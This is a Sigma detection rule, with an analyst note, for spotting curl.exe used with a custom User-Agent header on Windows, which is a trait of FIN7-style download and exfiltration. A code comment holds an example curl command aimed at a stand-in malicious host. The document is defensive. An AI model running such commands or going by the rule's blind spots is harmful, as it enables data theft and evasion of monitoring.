title: Curl Web Request With Potential Custom User-Agent
id: 85de1f22-d189-44e4-8239-dc276b45379b
status: test
description: Detects execution of "curl.exe" with a potential custom 
  "User-Agent". Attackers can leverage this to download or exfiltrate data via 
  "curl" to a domain that only accept specific "User-Agent" strings
references:
- https://labs.withsecure.com/publications/fin7-target-veeam-servers
- https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv
author: Nasreddine Bencherchali (Nextron Systems)
date: 2023-07-27
modified: 2025-12-11
tags:
- attack.execution
logsource:
  category: process_creation
  product: windows
detection:
    # Example: This command line would trigger the rule
    # curl.exe -H "User-Agent: EvilAgent" http://malicious.example.com
  selection_img:
  - Image|endswith: '\curl.exe'
  - OriginalFileName: 'curl.exe'
  selection_header_flag_1:
    CommandLine|re: '\s-H\s'     # Must be Regex as the flag needs to be case sensitive
  selection_header_flag_2:
    CommandLine|contains: '--header'
  selection_user_agent:
    CommandLine|contains: 'User-Agent:'
  condition: selection_img and 1 of selection_header_* and selection_user_agent
falsepositives:
- Unknown
level: medium
regression_tests_path: 
  regression_data/rules/windows/process_creation/proc_creation_win_curl_custom_user_agent/info.yml
note: |
  ### Technical Context

  This rule detects the execution of `curl.exe` with a custom "User-Agent" header, which attackers may utilize to exfiltrate or download data from external servers. The likely objective is to evade detection mechanisms by using a User-Agent string that closely mimics legitimate traffic. This behavior can be mapped to MITRE ATT&CK techniques, specifically under the tactic of Execution (T1203), with corresponding techniques such as Command-Line Interface (T1059).

  The primary telemetry sources are Windows process creation logs, specifically Security Event ID 4688 or Sysmon Event ID 1, which capture the execution of processes. If the detected behavior is deemed malicious, it may indicate data theft or command execution on compromised systems. Notably, this detection does NOT confirm malicious intent on its own; further context is needed to assess the legitimacy of the User-Agent and command.

  ### Investigation Steps

  - **Check the Command Line Arguments:** Review the command line arguments of the `curl.exe` execution. Look for suspicious User-Agent strings or URLs pointing to external domains (Event ID 4688, fields: CommandLine, NewProcessName). Legitimate use generally does not include custom User-Agent strings tailored to specific evasion tactics.

  - **Verify the Source of Execution:** Investigate the parent process that initiated `curl.exe` (Sysmon Event ID 1, field: ParentImage). If it runs under expected applications (e.g., legitimate software like scripts or system jobs), it may be benign; however, execution from unusual parent processes (such as `cmd.exe` or `powershell.exe`) could indicate malicious activity.

  - **Inspect Network Traffic for Exfiltration:** Analyze associated network traffic logs (e.g., NetFlow or Windows Firewall logs) to identify outbound connections made by `curl.exe`. Pay particular attention to traffic to domains that are newly registered or flagged as suspicious.

  - **Identify Custom User-Agent Patterns:** Catalog detected User-Agent strings. Compare them against known legitimate user agents and threat intelligence sources (e.g., the references provided). Strings that match blacklisted patterns indicate high confidence in malicious intent.

  - **Review Historical Actions:** Use your SIEM to trace previous use of `curl.exe` on the same host (Event ID 4688). A pattern of similar executions with non-standard User-Agents may indicate a compromised host engaged in persistent exfiltration efforts.

  ### Prioritization

  This alert should be considered medium severity due to the potential impact on sensitive data and the likelihood of adversarial abuse through established techniques. While not ubiquitous among legitimate users, compromised entities may frequently weaponize such behaviors.

  ### Blind Spots and Assumptions

  Detection may be limited by the absence of context from user activities; legitimate software tools can invoke `curl` with custom User-Agents as part of their normal operation. Ensure proper configuration of endpoint logging for comprehensive coverage. Notably, automated scripts or legitimate cloud service interactions might inadvertently trigger this alert. A companion detection rule focusing on anomalous outbound network requests which correlates with this behavior can enhance overall security posture.

